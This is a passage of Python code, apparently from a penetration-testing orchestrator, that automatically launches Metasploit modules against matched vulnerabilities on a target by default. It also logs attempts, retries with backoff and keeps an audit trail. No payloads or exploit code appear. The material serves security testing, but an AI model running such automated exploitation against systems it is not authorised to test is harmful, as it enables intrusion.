        if matched_vulns and vector != AttackVector.METASPLOIT and parameters.get("auto_exploit", True):
            for vuln in matched_vulns:
                if not vuln.get("metasploit_module"):
                    continue
                child_ctx = context.spawn_child(
                    vector=AttackVector.METASPLOIT,
                    suffix=f":{vuln['metasploit_module']}",
                    module=vuln["metasploit_module"],
                    options={
                        "RHOSTS": target,
                        "RPORT": parameters.get("port"),
                    },
                )
                try:
                    auto_outcome = self.meta_module.execute(child_ctx)
                    outcome.artifacts.setdefault("auto_exploits", []).append(
                        {
                            "module": vuln["metasploit_module"],
                            "status": auto_outcome.status,
                            "details": auto_outcome.details,
                        }
                    )
                except AttackExecutionError as exc:
                    outcome.artifacts.setdefault("auto_exploits", []).append(
                        {
                            "module": vuln["metasploit_module"],
                            "status": "failed",
                            "details": str(exc),
                        }
                    )

        outcome.matched_vulns = matched_vulns
        event_data = {
            "target": target,
            "vector": vector.value,
            "status": outcome.status,
            "success": outcome.success,
            "details": outcome.details,
            "artifacts": outcome.artifacts,
            "evidence": outcome.evidence,
            "profile": profile.value,
            "dry_run": context.dry_run,
            "sla": sla,
            "matched_vulns": matched_vulns,
        }

        event = BaseEvent(
            event_id=event_id,
            event_type=f"attack.{vector.value}",
            source=module.module_name,
            data=event_data,
        )

        with self._lock:
            self.history[event_id] = event.to_dict()

        self.audit.log_event(event_id, "completed", event_data)
        self.audit.persist_artifact(event_id, "result", event_data)

        return event

    def _run_with_retry(
        self,
        module: BaseAttackModule,
        context: AttackContext,
        retry_policy: RetryPolicy,
    ) -> AttackOutcome:
        attempt = 0
        start = time.time()
        last_error: Optional[Exception] = None

        while attempt < retry_policy.max_attempts:
            if context.event_id in self.cancellations:
                raise AttackExecutionError(f"Атака {context.event_id} отменена вручную")

            attempt += 1
            try:
                self.audit.log_event(
                    context.event_id,
                    "attempt",
                    {"attempt": attempt, "vector": context.vector.value},
                )
                outcome = module.execute(context)
                outcome.attempts = attempt
                outcome.duration_seconds = time.time() - start
                return outcome
            except RecoverableAttackError as exc:
                last_error = exc
                delay = min(retry_policy.base_delay * (2 ** (attempt - 1)), retry_policy.max_delay)
                self.audit.log_event(
                    context.event_id,
                    "retry",
                    {"attempt": attempt, "delay": delay, "error": str(exc)},
                )
                time.sleep(delay)
            except AttackExecutionError as exc:
                last_error = exc
                break

        raise AttackExecutionError(f"Атака завершилась ошибкой: {last_error}")


__all__ = [
    "AttackOrchestrator",
    "AttackVector",
    "TestingModel",
    "AttackExecutionError",
]

